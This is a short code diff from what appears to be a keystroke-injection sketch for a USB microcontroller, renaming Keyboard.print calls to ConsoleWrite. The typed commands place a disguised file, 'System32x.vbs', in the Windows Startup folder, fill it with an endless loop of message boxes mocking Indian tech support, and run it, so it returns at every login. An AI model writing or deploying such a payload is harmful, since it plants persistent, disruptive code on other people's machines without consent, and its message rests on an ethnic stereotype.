@@ -59,15 +59,15 @@ void loop() {
 
         delay(Fast);
 
-        Keyboard.print("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
+        ConsoleWrite("cd AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
 
-        Keyboard.print("del System32x.vbs");
+        ConsoleWrite("del System32x.vbs");
 
-        Keyboard.print("echo do > System32x.vbs");
+        ConsoleWrite("echo do > System32x.vbs");
 
-        Keyboard.print("echo msgbox(\"Indian Tech Support Is Here\") >> System32x.vbs");
+        ConsoleWrite("echo msgbox(\"Indian Tech Support Is Here\") >> System32x.vbs");
 
-        Keyboard.print("echo loop >> System32x.vbs");
+        ConsoleWrite("echo loop >> System32x.vbs");
 
         ConsoleWrite("System32x.vbs");
 
